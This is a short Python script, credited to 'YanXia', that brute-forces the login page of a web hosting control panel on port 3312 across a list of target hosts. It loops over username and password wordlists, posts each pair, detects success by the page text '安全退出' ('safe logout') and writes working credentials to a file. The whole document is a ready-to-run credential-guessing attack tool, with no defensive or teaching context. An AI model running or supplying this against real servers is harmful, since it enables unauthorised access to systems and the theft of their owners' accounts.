import requests,time
headers = {'content-type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:22.0) Gecko/20100101 Firefox/22.0'}
def  baopo():
 for username in open('user.txt'):
    username = username.replace('\n', '')
    for passwd in open('pass.txt'):
        passwd = passwd.replace('\n', '')
        data = {
            'username': username,
            'passwd': passwd,
        }
        for url in open('url.txt'):
            urls = url + ':3312/vhost/index.php?c=session&a=login'
            try:
                r = requests.post(urls, data=data, headers=headers)
                if '安全退出' in r.text:
                    cg = urls + "|" + username + '|' + passwd
                    print(cg)
                    file = open("bp.txt", "a+")
                    file.write(cg + "\n")
                    file.close()
                else:
                    print('error')
            except Exception as result:
                time.sleep(0.1)

if __name__ == '__main__':
    print('---------------')
    print('powered by YanXia')
    print('By YX‘blog：www.535yx.cn')
    print('---------------')
    baopo()
